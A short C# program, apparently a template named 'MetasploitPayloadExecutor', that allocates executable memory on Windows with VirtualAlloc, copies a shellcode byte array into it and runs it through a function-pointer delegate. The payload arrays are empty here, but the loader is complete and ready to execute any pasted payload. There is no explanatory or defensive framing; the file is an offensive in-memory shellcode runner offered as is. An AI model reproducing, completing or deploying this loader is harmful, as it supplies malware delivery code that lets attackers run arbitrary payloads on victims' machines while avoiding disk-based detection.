using System;
using System.Runtime.InteropServices;

namespace MetasploitPayloadExecutor
{
    class Program
    {
        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void WindowsRun();

        static void Main(string[] args)
        {
            OperatingSystem os = Environment.OSVersion;
            bool x86 = (IntPtr.Size == 4);
            byte[] payload;

            if (os.Platform == PlatformID.Win32Windows || os.Platform == PlatformID.Win32NT)
            {
                if (x86)
                {
                    payload = new byte[] { };
                }
                else
                {
                    payload = new byte[] { };
                }

                IntPtr ptr = VirtualAlloc(IntPtr.Zero, (IntPtr)payload.Length, (IntPtr)0x1000, (IntPtr)0x40);
                Marshal.Copy(payload, 0, ptr, payload.Length);
                WindowsRun runner = (WindowsRun)Marshal.GetDelegateForFunctionPointer(ptr, typeof(WindowsRun));
                runner();
            }
        }
    }
}
